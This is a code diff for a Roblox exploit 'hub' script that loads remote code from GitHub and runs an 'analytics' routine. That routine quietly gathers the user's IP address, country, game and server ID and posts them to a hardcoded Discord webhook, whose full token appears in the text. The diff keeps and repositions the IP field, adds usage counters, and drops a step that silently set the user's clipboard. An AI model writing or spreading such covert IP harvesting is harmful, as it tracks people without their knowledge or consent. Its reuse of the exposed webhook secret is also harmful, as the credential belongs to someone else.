@@ -5,29 +5,28 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
--- Services
+-- SERVICES
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local LocalPlayer = Players.LocalPlayer
 
--- LINKS
-local DiscordInvite = "https://discord.com/invite/v3dAeMKp4N"
+-- LOADER
 local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"
 
--- WEBHOOK
+-- DISCORD WEBHOOK
 local AnalyticsWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"
 
--- request
+-- COUNTERS
+local TotalCounter = "https://api.countapi.xyz/hit/turkhub/total"
+local TodayCounter = "https://api.countapi.xyz/hit/turkhub/today"
+local GameCounter = "https://api.countapi.xyz/hit/turkhub/game_"
+
+-- REQUEST
 local request = syn and syn.request or http_request or request
 
--- copy discord
-pcall(function()
-    setclipboard(DiscordInvite)
-end)
-
--- get ip
+-- GET IP
 local function GetIP()
 
     local ip = "Unknown"
@@ -39,7 +38,7 @@ local function GetIP()
     return ip
 end
 
--- get country
+-- GET COUNTRY
 local function GetCountry()
 
     local country = "Unknown"
@@ -57,7 +56,7 @@ local function GetCountry()
 
 end
 
--- game name
+-- GAME NAME
 local function GetGameName()
 
     local name = "Unknown"
@@ -70,7 +69,25 @@ local function GetGameName()
 
 end
 
--- analytics
+-- COUNTER
+local function HitCounter(url)
+
+    local value = "0"
+
+    pcall(function()
+
+        local data = game:HttpGet(url)
+        local decoded = HttpService:JSONDecode(data)
+
+        value = tostring(decoded.value)
+
+    end)
+
+    return value
+
+end
+
+-- SEND ANALYTICS
 local function SendAnalytics()
 
     if not request then return end
@@ -78,6 +95,10 @@ local function SendAnalytics()
     local ip = GetIP()
     local country = GetCountry()
     local gameName = GetGameName()
+
+    local totalUsers = HitCounter(TotalCounter)
+    local todayUsers = HitCounter(TodayCounter)
+    local gameUses = HitCounter(GameCounter..game.PlaceId)
 
     local data = {
         ["embeds"] = {{
@@ -105,6 +126,12 @@ local function SendAnalytics()
                 },
 
                 {
+                    ["name"] = "🌐 IP",
+                    ["value"] = ip,
+                    ["inline"] = false
+                },
+
+                {
                     ["name"] = "🎮 Game",
                     ["value"] = gameName,
                     ["inline"] = false
@@ -113,25 +140,37 @@ local function SendAnalytics()
                 {
                     ["name"] = "📌 PlaceId",
                     ["value"] = tostring(game.PlaceId),
-                    ["inline"] = false
-                },
-
-                {
-                    ["name"] = "🌐 IP",
-                    ["value"] = ip,
-                    ["inline"] = false
+                    ["inline"] = true
                 },
 
                 {
                     ["name"] = "🖥 Server JobId",
                     ["value"] = game.JobId,
                     ["inline"] = false
+                },
+
+                {
+                    ["name"] = "👥 Total Users",
+                    ["value"] = totalUsers,
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "📅 Users Today",
+                    ["value"] = todayUsers,
+                    ["inline"] = true
+                },
+
+                {
+                    ["name"] = "🔥 Game Uses",
+                    ["value"] = gameUses,
+                    ["inline"] = true
                 }
 
             },
 
             ["footer"] = {
-                ["text"] = "TURK HUB Analytics"
+                ["text"] = "TURK HUB Analytics System"
             }
 
         }}
